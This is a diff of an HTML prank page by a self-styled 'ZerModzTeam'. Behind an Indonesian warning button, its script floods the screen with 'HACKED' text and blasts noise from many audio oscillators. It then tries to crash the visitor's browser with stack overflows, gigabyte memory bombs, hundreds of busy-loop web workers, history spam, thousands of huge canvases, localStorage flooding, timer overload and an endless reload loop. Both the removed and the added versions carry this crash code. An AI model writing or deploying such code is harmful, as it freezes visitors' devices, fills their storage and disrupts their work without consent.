@@ -3,294 +3,196 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ZerModz Warning</title>
+    <title>Zero Final</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             background: black;
-            color: white;
-            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            width: 100vw;
             height: 100vh;
+            position: relative;
+            font-family: 'Courier New', monospace;
+        }
+        #warning {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: black;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            overflow: hidden;
+            z-index: 999999;
         }
-        #warning-container {
-            text-align: center;
-            z-index: 10000;
-        }
-        #warning-text {
-            font-size: 3rem;
-            font-weight: bold;
+        #warning h1 {
             color: red;
-            text-shadow: 0 0 30px red, 0 0 60px yellow;
-            animation: warning-blink 0.5s infinite;
-            margin-bottom: 50px;
-            padding: 20px;
+            font-size: 4rem;
+            text-align: center;
+            animation: blink 0.5s infinite;
             border: 5px solid red;
-            border-radius: 20px;
-            background: rgba(0,0,0,0.8);
+            padding: 20px;
+            text-shadow: 0 0 30px red;
         }
-        @keyframes warning-blink {
-            0% { opacity: 1; text-shadow: 0 0 30px red; }
-            50% { opacity: 0.5; text-shadow: 0 0 60px yellow; }
-            100% { opacity: 1; text-shadow: 0 0 30px red; }
-        }
-        #confirm-btn {
-            font-size: 2.5rem;
+        #btn {
+            font-size: 3rem;
             padding: 20px 60px;
-            background: linear-gradient(45deg, red, darkred);
-            color: white;
+            background: red;
             border: 3px solid white;
             border-radius: 50px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 0 50px red;
-            animation: btn-pulse 1s infinite;
-        }
-        @keyframes btn-pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        #crash-content {
-            display: none;
-            width: 100%;
-            height: 100%;
-            position: relative;
-        }
-        .floating-text {
-            position: absolute;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            white-space: nowrap;
-            user-select: none;
-            pointer-events: none;
-            animation: float 0.3s infinite alternate;
-            text-shadow: 0 0 10px currentColor;
-            z-index: 1;
-        }
-        @keyframes float {
-            0% { transform: translate(0, 0) rotate(0deg); }
-            100% { transform: translate(40px, 40px) rotate(360deg); }
-        }
-        #main-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
             color: white;
-            font-size: 4rem;
+            font-weight: bold;
+            margin-top: 50px;
+            animation: pulse 1s infinite;
+            cursor: pointer;
+        }
+        @keyframes blink { 50% { opacity: 0.5; } }
+        @keyframes pulse { 50% { transform: scale(1.1); } }
+        .teks-terbang {
+            position: absolute;
+            white-space: nowrap;
+            font-weight: bold;
+            pointer-events: none;
+            animation: fly 0.2s infinite alternate;
+            text-shadow: 0 0 10px currentColor;
+        }
+        @keyframes fly {
+            0% { transform: translate(0,0) rotate(0deg); }
+            100% { transform: translate(50px,50px) rotate(360deg); }
+        }
+        #teks-utama {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%,-50%);
+            font-size: 5rem;
             font-weight: 900;
             text-align: center;
-            text-shadow: 0 0 50px cyan, 0 0 100px magenta, 0 0 150px yellow;
-            animation: superblink 0.02s infinite;
-            z-index: 9999;
-            background: rgba(0,0,0,0.8);
+            animation: superblink 0.01s infinite;
+            background: black;
             padding: 20px;
             border: 5px solid white;
             border-radius: 20px;
+            z-index: 9999;
+            text-shadow: 0 0 50px cyan, 0 0 100px magenta;
         }
         @keyframes superblink {
-            0% { color: black; background: white; text-shadow: 0 0 80px red; }
-            10% { color: red; background: cyan; text-shadow: 0 0 80px lime; }
-            20% { color: yellow; background: blue; text-shadow: 0 0 80px magenta; }
-            30% { color: lime; background: purple; text-shadow: 0 0 80px cyan; }
-            40% { color: cyan; background: red; text-shadow: 0 0 80px yellow; }
-            50% { color: magenta; background: lime; text-shadow: 0 0 80px blue; }
-            60% { color: white; background: black; text-shadow: 0 0 80px red; }
-            70% { color: black; background: yellow; text-shadow: 0 0 80px cyan; }
-            80% { color: blue; background: magenta; text-shadow: 0 0 80px white; }
-            90% { color: purple; background: lime; text-shadow: 0 0 80px yellow; }
-            100% { color: black; background: white; text-shadow: 0 0 80px magenta; }
+            0% { color: black; background: white; }
+            10% { color: red; background: cyan; }
+            20% { color: yellow; background: blue; }
+            30% { color: lime; background: purple; }
+            40% { color: cyan; background: red; }
+            50% { color: magenta; background: lime; }
+            60% { color: white; background: black; }
+            70% { color: black; background: yellow; }
+            80% { color: blue; background: magenta; }
+            90% { color: purple; background: lime; }
+            100% { color: black; background: white; }
         }
     </style>
 </head>
 <body>
-    <div id="warning-container">
-        <div id="warning-text">⚠️ YAKIN MAU CLICK? NANTI RUSAK LOH!! ⚠️</div>
-        <div id="confirm-btn">GAS KEUN 🔥</div>
+    <div id="warning">
+        <h1>⚠️ YAKIN MAU CLICK? NANTI RUSAK LOH!! ⚠️</h1>
+        <div id="btn">GAS KEUN 🔥</div>
     </div>
 
-    <div id="crash-content"></div>
-
     <script>
-        document.getElementById('confirm-btn').addEventListener('click', function() {
-            // Hilangkan warning
-            document.getElementById('warning-container').style.display = 'none';
+        document.getElementById('btn').onclick = function() {
+            document.getElementById('warning').remove();
             
-            // Tampilkan konten crash
-            const crashDiv = document.getElementById('crash-content');
-            crashDiv.style.display = 'block';
+            // ========== LANGSUNG EKSEKUSI SEMUA ==========
+            const b = document.body;
             
-            // ========== 1. 5000 TEKS BERHAMBURAN ==========
-            for (let i = 0; i < 5000; i++) {
-                const div = document.createElement('div');
-                div.className = 'floating-text';
-                div.textContent = 'HACKED ' + i;
-                div.style.left = Math.random() * 100 + '%';
-                div.style.top = Math.random() * 100 + '%';
-                div.style.fontSize = (10 + Math.random() * 60) + 'px';
-                div.style.color = 'hsl(' + (Math.random() * 360) + ', 100%, 50%)';
-                div.style.animationDelay = (Math.random() * 2) + 's';
-                div.style.animationDuration = (0.2 + Math.random() * 0.8) + 's';
-                div.style.transform = 'rotate(' + (Math.random() * 360) + 'deg)';
-                div.style.opacity = 0.7 + Math.random() * 0.3;
-                crashDiv.appendChild(div);
+            // 5000 teks
+            for (let i=0; i<5000; i++) {
+                let d = document.createElement('div');
+                d.className = 'teks-terbang';
+                d.textContent = 'HACKED ' + i;
+                d.style.left = Math.random()*100 + '%';
+                d.style.top = Math.random()*100 + '%';
+                d.style.fontSize = (10+Math.random()*60) + 'px';
+                d.style.color = 'hsl(' + (Math.random()*360) + ',100%,50%)';
+                d.style.animationDuration = (0.1+Math.random()*0.3) + 's';
+                b.appendChild(d);
             }
-
-            // ========== 2. TEKS UTAMA ==========
-            const mainText = document.createElement('div');
-            mainText.id = 'main-text';
-            mainText.textContent = 'HACKED BY ZerModzTeam';
-            crashDiv.appendChild(mainText);
-
-            // ========== 3. 1000 SUARA BERSAMAAN ==========
-            (function spawn1000Sounds() {
-                try {
-                    const AudioContext = window.AudioContext || window.webkitAudioContext;
-                    if (!AudioContext) return;
-
-                    for (let ctxIndex = 0; ctxIndex < 50; ctxIndex++) {
-                        setTimeout(() => {
-                            try {
-                                const audioCtx = new AudioContext();
-                                const compressor = audioCtx.createDynamicsCompressor();
-                                compressor.threshold.setValueAtTime(-60, audioCtx.currentTime);
-                                compressor.ratio.setValueAtTime(20, audioCtx.currentTime);
-
-                                const masterGain = audioCtx.createGain();
-                                masterGain.gain.value = 0.05;
-
-                                compressor.connect(masterGain);
-                                masterGain.connect(audioCtx.destination);
-
-                                const types = ['sine', 'square', 'sawtooth', 'triangle'];
-
-                                for (let i = 0; i < 20; i++) {
-                                    const osc = audioCtx.createOscillator();
-                                    osc.type = types[Math.floor(Math.random() * types.length)];
-                                    osc.frequency.value = 20 + Math.random() * 3000;
-
-                                    const gainNode = audioCtx.createGain();
-                                    gainNode.gain.value = 0.005 + Math.random() * 0.02;
-
-                                    osc.connect(gainNode);
-                                    gainNode.connect(compressor);
-
-                                    osc.start();
-                                    osc.stop(audioCtx.currentTime + 10);
-                                }
-
-                                const bufferSize = 4096;
-                                const noiseNode = audioCtx.createScriptProcessor(bufferSize, 1, 1);
-                                noiseNode.onaudioprocess = function(e) {
-                                    const output = e.outputBuffer.getChannelData(0);
-                                    for (let i = 0; i < bufferSize; i++) {
-                                        output[i] = Math.random() * 2 - 1;
-                                    }
-                                };
-                                noiseNode.connect(compressor);
-
-                                if (audioCtx.state === 'suspended') {
-                                    audioCtx.resume();
-                                }
-                            } catch(e) {}
-                        }, ctxIndex * 10);
-                    }
-                } catch(e) {}
-            })();
-
-            // ========== 4. CRASH EXTREME ==========
-            function ultimateCrash() {
-                // LAPIS 1: Stack overflow
-                (function stack() {
-                    (function stack2() {
-                        (function stack3() {
-                            stack3();
-                        })();
-                        stack2();
-                    })();
-                    stack();
-                })();
-
-                // LAPIS 2: Memory bomb
-                let memArr = [];
-                for (let i = 0; i < 50000; i++) {
+            
+            // teks utama
+            let utama = document.createElement('div');
+            utama.id = 'teks-utama';
+            utama.textContent = 'HACKED BY ZerModzTeam';
+            b.appendChild(utama);
+            
+            // 2000 suara (100 context x 20 osc)
+            for (let c=0; c<100; c++) {
+                setTimeout(() => {
                     try {
-                        memArr.push(new ArrayBuffer(50000000));
-                        memArr.push(new Blob([new Uint8Array(100000000)]));
-                        memArr.push(new Array(10000000).join('x'));
-                    } catch(e) {}
-                }
-
-                // LAPIS 3: 50 Web Worker
-                try {
-                    for (let w = 0; w < 50; w++) {
-                        const workerCode = `
-                            while(1) {
-                                for(let i=0; i<999999999; i++) { Math.sqrt(i); new Array(999999).join('x'); new ArrayBuffer(10000000); }
-                            }
-                        `;
-                        const blob = new Blob([workerCode], {type: 'application/javascript'});
-                        new Worker(URL.createObjectURL(blob));
-                    }
-                } catch(e) {}
-
-                // LAPIS 4: History spam
-                setInterval(() => {
-                    for (let h = 0; h < 1000; h++) {
-                        history.pushState({}, '', '/#' + Math.random() + '?' + 'x'.repeat(50000));
-                    }
-                    history.back();
-                    history.forward();
-                    location.replace('about:blank');
-                }, 1);
-
-                // LAPIS 5: 500 Canvas
-                try {
-                    for (let c = 0; c < 500; c++) {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 4000;
-                        canvas.height = 4000;
-                        const ctx = canvas.getContext('2d');
-                        if (ctx) {
-                            for (let i = 0; i < 5000; i++) {
-                                ctx.fillStyle = 'rgb(' + i%255 + ',' + i%255 + ',' + i%255 + ')';
-                                ctx.fillRect(Math.random()*4000, Math.random()*4000, 200, 200);
-                            }
+                        let a = new (window.AudioContext||window.webkitAudioContext)();
+                        let g = a.createGain();
+                        g.gain.value = 0.02;
+                        g.connect(a.destination);
+                        for (let i=0; i<20; i++) {
+                            let o = a.createOscillator();
+                            o.type = ['sine','square','sawtooth','triangle'][Math.floor(Math.random()*4)];
+                            o.frequency.value = 20 + Math.random()*4000;
+                            let og = a.createGain();
+                            og.gain.value = 0.001 + Math.random()*0.005;
+                            o.connect(og);
+                            og.connect(g);
+                            o.start();
                         }
-                        crashDiv.appendChild(canvas);
-                    }
-                } catch(e) {}
-
-                // LAPIS 6: LocalStorage bomb
-                try {
-                    for (let s = 0; s < 20000; s++) {
-                        localStorage.setItem('key' + s, 'x'.repeat(100000));
-                    }
-                } catch(e) {}
-
-                // LAPIS 7: Timer overload
-                for (let t = 0; t < 20000; t++) {
-                    setInterval(() => {
-                        for(let z=0; z<100000; z++) { Math.random(); }
-                    }, 0);
-                }
-
-                // LAPIS 8: Infinite loop
-                let arr2 = [];
-                while(true) {
-                    arr2.push(new ArrayBuffer(100000000));
-                    for(let z=0; z<999999; z++) { Math.random(); }
-                }
+                        if (a.state === 'suspended') a.resume();
+                    } catch(e){}
+                }, c*2);
             }
-
-            // Mulai crash setelah 2 detik biar teks dan sound sempat jalan
-            setTimeout(ultimateCrash, 2000);
-        });
+            
+            // ========== CRASH TOTAL TANPA JEDA ==========
+            // Stack overflow
+            (function x() { (function y() { (function z() { z(); })(); y(); })(); x(); })();
+            
+            // Memory bomb 100rb array
+            let m = [];
+            for (let i=0; i<100000; i++) {
+                try { m.push(new ArrayBuffer(100000000)); } catch(e){}
+                try { m.push(new Blob([new Uint8Array(200000000)])); } catch(e){}
+                try { m.push(new Array(10000000).join('x')); } catch(e){}
+            }
+            
+            // 200 worker
+            for (let w=0; w<200; w++) {
+                try { new Worker(URL.createObjectURL(new Blob(['while(1){for(let i=0;i<999999999;i++){}}']))); } catch(e){}
+            }
+            
+            // History spam
+            setInterval(() => {
+                for (let h=0; h<10000; h++) history.pushState({},'','/#'+Math.random());
+                history.back();
+                location.replace('about:blank');
+            }, 0);
+            
+            // 5000 canvas
+            for (let cv=0; cv<5000; cv++) {
+                try {
+                    let c = document.createElement('canvas');
+                    c.width = 5000; c.height = 5000;
+                    c.getContext('2d').fillRect(0,0,5000,5000);
+                    b.appendChild(c);
+                } catch(e){}
+            }
+            
+            // LocalStorage full
+            for (let s=0; s<50000; s++) { try { localStorage.setItem('k'+s, 'x'.repeat(1000000)); } catch(e){} }
+            
+            // Timer 100000
+            for (let t=0; t<100000; t++) { setInterval(() => { for(let z=0;z<100000;z++){Math.random();} }, 0); }
+            
+            // Infinite loop final
+            let a = [];
+            while(true) {
+                a.push(new ArrayBuffer(1000000000));
+                for(let z=0;z<9999999;z++){ Math.random(); }
+                window.location.href = window.location.href;
+            }
+        };
     </script>
 </body>
 </html>
